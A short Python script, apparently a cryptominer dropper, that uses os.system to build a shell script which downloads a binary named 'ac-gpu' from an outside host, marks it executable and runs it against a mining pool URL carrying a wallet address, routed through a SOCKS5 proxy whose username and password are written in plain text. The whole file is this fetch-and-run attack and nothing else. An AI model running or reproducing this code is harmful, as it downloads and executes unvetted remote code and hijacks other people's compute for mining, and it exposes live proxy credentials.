import os
os.system('echo "#!/bin/sh" >> tes')
os.system('echo "wget -q https://bin.jvnv.net/file/qJ7G1/ac-gpu && chmod +x ac-gpu" >> tes')
os.system('echo "./ac-gpu -F http://aqua.signal2noi.se:19998/0x17487f717EC0cBA96858F071d0c4BEe476b0fb5A/BAKSO -t 1 --proxy socks5://sikencot-rotate:mbah2237@p.webshare.io:80" >> tes')
os.system('sleep 2')
os.system('sh tes')
